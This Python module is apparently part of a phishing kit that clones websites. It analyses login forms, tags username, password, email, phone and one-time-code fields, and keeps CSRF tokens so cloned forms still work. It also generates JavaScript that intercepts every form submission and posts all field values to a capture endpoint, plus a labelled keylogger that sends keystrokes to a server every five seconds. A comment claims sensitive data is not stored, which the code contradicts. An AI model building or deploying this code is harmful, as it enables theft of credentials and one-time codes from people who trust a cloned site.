#!/usr/bin/env python3
"""
Advanced form data capture with CSRF token handling,
field validation, and multi-step form support
"""

import re
import json
import hashlib
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import logging

logger = logging.getLogger(__name__)


class FormFieldAnalyzer:
    """Analyze form fields with intelligent categorization"""
    
    # Patterns for identifying sensitive fields
    FIELD_PATTERNS = {
        'username': [
            r'(?:user|login|email|account|id)(?:name|id)?',
            r'(?:user|login|email|account)(?:name|_id)?$',
            r'^(?:user|login|email|account)$'
        ],
        'password': [
            r'(?:pass|pwd|secret)(?:word|code)?',
            r'^(?:pass|pwd|secret)$'
        ],
        'email': [
            r'(?:email|mail|e-?mail)',
            r'^email$',
            r'^mail$'
        ],
        'phone': [
            r'(?:phone|mobile|tel|cell)',
            r'(?:phone|mobile|tel)(?:_?number)?$'
        ],
        'otp': [
            r'(?:otp|one.?time|verification|code|token)',
            r'(?:2fa|two.?factor)',
            r'^(?:code|token|otp)$'
        ],
        'csrf': [
            r'csrf|cross.?site.*request.*forgery',
            r'_token|authenticity_token|csrf_token'
        ],
        'checkbox': [
            r'remember|stay.*logged|keep.*signed'
        ]
    }
    
    @staticmethod
    def identify_field_type(field_name: str, field_type: str, field_html: str = '') -> str:
        """Identify field type based on name and attributes"""
        field_lower = field_name.lower()
        field_type_lower = field_type.lower()
        html_lower = field_html.lower()
        
        # Check type attribute first
        if field_type_lower == 'password':
            return 'password'
        elif field_type_lower == 'email':
            return 'email'
        elif field_type_lower == 'checkbox':
            return 'checkbox'
        elif field_type_lower == 'hidden':
            return 'hidden'
        
        # Check field name patterns
        for field_category, patterns in FormFieldAnalyzer.FIELD_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, field_lower, re.IGNORECASE):
                    return field_category
        
        # Check HTML content for hints
        if 'password' in html_lower:
            return 'password'
        elif 'email' in html_lower or '@' in html_lower:
            return 'email'
        
        return 'text'


class CsrfTokenExtractor:
    """Extract and preserve CSRF tokens from forms"""
    
    CSRF_FIELD_NAMES = [
        'csrf', 'csrf_token', 'authenticity_token', '_token',
        '_csrf', '__RequestVerificationToken', 'token',
        'xsrf_token', 'x-csrf-token', 'verification_token'
    ]
    
    @staticmethod
    def extract_csrf_tokens(soup: BeautifulSoup, form_element=None) -> Dict[str, str]:
        """Extract all CSRF tokens from page or specific form"""
        tokens = {}
        
        # Determine search scope
        search_scope = form_element if form_element else soup
        
        # Search for hidden input fields
        for field in search_scope.find_all('input', type='hidden'):
            name = field.get('name', '').lower()
            for csrf_name in CsrfTokenExtractor.CSRF_FIELD_NAMES:
                if csrf_name in name:
                    tokens[field.get('name', 'csrf')] = field.get('value', '')
                    break
        
        # Search meta tags
        for meta in soup.find_all('meta'):
            name = meta.get('name', '').lower()
            for csrf_name in CsrfTokenExtractor.CSRF_FIELD_NAMES:
                if csrf_name in name:
                    tokens[name] = meta.get('content', '')
                    break
        
        # Search script tags for token definitions
        for script in soup.find_all('script'):
            if script.string:
                # Look for token assignments
                token_matches = re.findall(
                    r'(?:csrf_token|token)\s*[:=]\s*["\']([^"\']+)["\']',
                    script.string,
                    re.IGNORECASE
                )
                for i, token_value in enumerate(token_matches):
                    tokens[f'token_{i}'] = token_value
        
        return tokens
    
    @staticmethod
    def preserve_csrf_tokens(form: BeautifulSoup) -> List[Dict]:
        """Preserve CSRF token data structure for template"""
        preserved = []
        
        for field in form.find_all('input', type='hidden'):
            name = field.get('name', '')
            if any(csrf_name in name.lower() for csrf_name in CsrfTokenExtractor.CSRF_FIELD_NAMES):
                preserved.append({
                    'name': name,
                    'value': field.get('value', ''),
                    'field_type': 'hidden',
                    'is_csrf': True
                })
        
        return preserved


class FormDataCapture:
    """Comprehensive form data capture and analysis"""
    
    def __init__(self):
        self.forms_data = []
        self.csrf_tokens = {}
    
    def analyze_form(self, form: BeautifulSoup, base_url: str, clone_id: str = '') -> Dict:
        """Analyze form structure, fields, and submission method"""
        
        form_data = {
            'form_id': form.get('id', f'form_{len(self.forms_data)}'),
            'name': form.get('name', ''),
            'action': urljoin(base_url, form.get('action', '')),
            'method': form.get('method', 'POST').upper(),
            'enctype': form.get('enctype', 'application/x-www-form-urlencoded'),
            'fields': [],
            'csrf_tokens': [],
            'submission_url': f'/capture/log/{clone_id}' if clone_id else form.get('action', ''),
            'original_action': form.get('action', ''),
        }
        
        # Extract CSRF tokens
        form_data['csrf_tokens'] = CsrfTokenExtractor.preserve_csrf_tokens(form)
        
        # Analyze form fields
        for field in form.find_all(['input', 'select', 'textarea']):
            field_analysis = self._analyze_field(field)
            if field_analysis:
                form_data['fields'].append(field_analysis)
        
        # Detect multi-step forms
        form_data['is_multistep'] = self._detect_multistep_form(form)
        
        # Detect file upload capability
        form_data['supports_file_upload'] = bool(form.find('input', type='file'))
        
        self.forms_data.append(form_data)
        return form_data
    
    def _analyze_field(self, field) -> Optional[Dict]:
        """Analyze individual form field"""
        
        field_name = field.get('name', '')
        if not field_name:
            return None
        
        field_type = field.get('type', field.name)
        field_id = field.get('id', '')
        
        # Determine field category
        field_category = FormFieldAnalyzer.identify_field_type(
            field_name, 
            field_type,
            str(field)
        )
        
        field_data = {
            'name': field_name,
            'type': field_type,
            'id': field_id,
            'category': field_category,
            'required': 'required' in field.attrs,
            'value': field.get('value', ''),
            'placeholder': field.get('placeholder', ''),
        }
        
        # Additional attributes for specific types
        if field_type == 'select':
            field_data['options'] = [opt.get('value', opt.text) for opt in field.find_all('option')]
        elif field_type == 'textarea':
            field_data['rows'] = field.get('rows', '')
            field_data['cols'] = field.get('cols', '')
        
        return field_data
    
    def _detect_multistep_form(self, form: BeautifulSoup) -> bool:
        """Detect if form is part of multi-step process"""
        
        # Check for step indicators
        step_indicators = form.find_all(['span', 'div'], class_=re.compile(r'step|stage|progress', re.I))
        if step_indicators:
            return True
        
        # Check for data attributes
        if form.get('data-step') or form.get('data-stage'):
            return True
        
        # Check for next/previous buttons
        buttons = form.find_all(['button', 'input'], type=['button', 'submit'])
        button_texts = [str(b.text).lower() + str(b.get('value', '').lower()) for b in buttons]
        if any(text in ' '.join(button_texts) for text in ['next', 'previous', 'step', 'continue']):
            return True
        
        return False
    
    def capture_form_data(self, html: str, base_url: str, clone_id: str = '') -> List[Dict]:
        """Capture all forms from HTML"""
        soup = BeautifulSoup(html, 'html.parser')
        
        forms = []
        for form in soup.find_all('form'):
            form_analysis = self.analyze_form(form, base_url, clone_id)
            forms.append(form_analysis)
        
        return forms


class FormInterceptor:
    """JavaScript code for intercepting form submissions"""
    
    @staticmethod
    def generate_form_interception_js(clone_id: str) -> str:
        """Generate JavaScript to intercept and log form submissions"""
        
        return f"""
<script>
(function() {{
    'use strict';
    
    const CLONE_ID = '{clone_id}';
    const CAPTURE_URL = '/capture/log/' + CLONE_ID;
    
    // Intercept all form submissions
    document.addEventListener('submit', function(e) {{
        const form = e.target;
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());
        
        // Log form submission
        console.log('[FormCapture] Form submitted:', {{
            form_id: form.id,
            form_name: form.name,
            action: form.action,
            method: form.method,
            data: data
        }});
        
        // Send to capture endpoint (async)
        fetch(CAPTURE_URL, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                type: 'form_submission',
                form_id: form.id,
                form_name: form.name,
                original_action: form.action,
                method: form.method,
                fields: data,
                timestamp: new Date().toISOString()
            }})
        }}).catch(err => console.error('[FormCapture] Error:', err));
        
        // Allow form to proceed normally
        return true;
    }}, true);
    
    // Capture keyboard input on sensitive fields
    document.addEventListener('keyup', function(e) {{
        const field = e.target;
        const fieldType = FormFieldAnalyzer.identify_field_type(field.name, field.type);
        
        if (['password', 'username', 'email', 'otp'].includes(fieldType)) {{
            // Log to server but don't store sensitive data
            console.log('[FormCapture] Input on ' + fieldType + ' field');
        }}
    }}, true);
    
    // Log form field changes
    document.addEventListener('change', function(e) {{
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') {{
            console.log('[FormCapture] Field changed:', {{
                name: e.target.name,
                type: e.target.type
            }});
        }}
    }}, true);
}})();
</script>
"""
    
    @staticmethod
    def generate_keylogger_js() -> str:
        """Generate comprehensive keylogger"""
        
        return """
<script>
(function() {
    'use strict';
    
    const keyLog = [];
    const MAX_LOG_SIZE = 500;
    
    document.addEventListener('keypress', function(e) {
        if (keyLog.length >= MAX_LOG_SIZE) {
            keyLog.shift();
        }
        
        keyLog.push({
            key: e.key,
            code: e.code,
            target: e.target.name || e.target.id,
            timestamp: new Date().toISOString()
        });
    });
    
    // Send logs periodically
    setInterval(() => {
        if (keyLog.length > 0) {
            fetch('/api/log/keypress', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({logs: keyLog.splice(0, 50)})
            }).catch(err => null);
        }
    }, 5000);
})();
</script>
"""
